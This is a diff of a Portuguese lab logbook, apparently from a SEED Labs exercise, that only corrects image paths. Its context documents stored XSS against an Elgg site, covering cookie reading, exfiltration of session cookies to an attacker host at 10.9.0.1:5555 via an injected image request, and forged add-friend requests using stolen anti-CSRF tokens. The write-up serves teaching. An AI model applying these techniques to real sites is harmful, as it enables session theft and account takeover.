@@ -21,7 +21,7 @@ Objetivo: inserir código JavaScript malicioso no perfil do utilizador (Samy) de
 7. Abrir o perfil de Samy. O browser carrega o HTML do perfil e executa o JavaScript embebido, mostrando a janela `alert('XSS by [grupo6]')`.
 
 ### Evidência
-![Task 1 Stored XSS popup](Loogbooks/images/7_1_alice_check_xss_samy.png)
+![Task 1 Stored XSS popup](images/7_1_alice_check_xss_samy.png)
 
 ### Explicação Técnica
 O campo de descrição é armazenado na base de dados e reapresentado sem sanitização. Ao ser incluído no DOM da página de perfil, o conteúdo `<script>...</script>` é interpretado como script de mesma origem (`www.seed-server.com`). O código corre com os privilégios dessa origem e pode aceder ao `document.cookie`, modificar o DOM ou iniciar requisições AJAX. Como o payload está persistido, qualquer utilizador que visite o perfil (incluindo o próprio Samy ao reler) executa o script — característica que distingue Stored XSS de Reflected XSS (onde o payload apenas viaja na requisição e não é guardado).
@@ -48,7 +48,7 @@ Objetivo: adaptar o payload para revelar o cookie de sessão do visitante que ab
 7. Surge um popup contendo o valor atual de `document.cookie` da Alice (inclui a cookie de sessão Elgg, ex.: `Elgg=a0t1kmahfk9k3hsmtpmoa1hj8a; ...`).
 
 ### Evidência
-![Task 2 document.cookie](Loogbooks/images/7_2_cookie_check.png)
+![Task 2 document.cookie](images/7_2_cookie_check.png)
 
 ### Explicação Técnica
 O JavaScript executa sob a mesma origem `www.seed-server.com`; a Same Origin Policy permite ao código ler `document.cookie` dessa origem. Como a aplicação não efetuou escaping ou filtragem, o atacante armazenou um `<script>` que o servidor devolve integralmente. Quando Alice carrega a página, o script corre "de dentro" do contexto legítimo e lê as cookies que, de outro modo, seriam protegidas contra acesso de origens externas. Isto ilustra porque XSS quebra a confidencialidade de credenciais de sessão: o browser não distingue entre código legítimo e código injetado se ambos provêm da mesma origem. 
@@ -81,7 +81,7 @@ Objetivo: não só visualizar, mas enviar as cookies de sessão do visitante par
 7. O browser tenta carregar a imagem e gera um `HTTP GET` para `http://10.9.0.1:5555/?c=...`; o netcat mostra o pedido contendo o cookie Elgg codificado (`Elgg=...`).
 
 ### Evidência
-![Task 3 exfiltração cookie via GET](Loogbooks/images/7_3_.png)
+![Task 3 exfiltração cookie via GET](images/7_3_.png)
 
 ### Explicação Técnica
 O `document.write()` insere dinamicamente uma tag `<img>` cujo atributo `src` aponta para o host do atacante e inclui as cookies na query string. Navegadores permitem (mesmo sob Same Origin Policy) emitir pedidos para outras origens; a restrição está na leitura programática da resposta, não no envio. Assim, o browser envia os dados para fora, funcionando como canal de exfiltração. A função `escape()` percent‑codifica caracteres especiais garantindo que a cookie inteira aparece na query sem quebrar o URL. O atacante recupera o valor diretamente da linha `GET /?c=...` capturada pelo netcat.
@@ -108,7 +108,7 @@ Referer: http://www.seed-server.com/profile/samy
 - `__elgg_ts` e `__elgg_token`: tokens anti‑CSRF por sessão que o backend valida.
 
 ### Evidência
-![Task 4 captura pedido add friend](Loogbooks/images/7_4_watch_request.png)
+![Task 4 captura pedido add friend](images/7_4_watch_request.png)
 
 ### 4.2 Payload XSS (Ajax GET)
 Colocado no campo “About me” do perfil do Samy em modo Text:
@@ -137,8 +137,8 @@ window.onload = function () {
 - A interface passa a mostrar “Remove friend” no perfil do Samy, confirmando que a amizade foi criada automaticamente.
 
 ### Evidência
-- ![Task 4 estado amigo criado](Loogbooks/images/7_4_friend_already.png)
-- ![Task 4 log rede add friend](Loogbooks/images/7_4_friend_log.png)
+- ![Task 4 estado amigo criado](images/7_4_friend_already.png)
+- ![Task 4 log rede add friend](images/7_4_friend_log.png)
 
 ### Explicação Técnica
 O código XSS corre com a mesma origem e sessão da vítima. Por isso, consegue ler os tokens `elgg.security.token.__elgg_ts` e `__elgg_token` e construir um pedido indistinguível de um pedido legítimo emitido pela aplicação. Tokens anti‑CSRF param pedidos vindos de outros sites, mas não param XSS, pois o script malicioso executa dentro da própria aplicação e tem acesso às mesmas credenciais/variáveis.
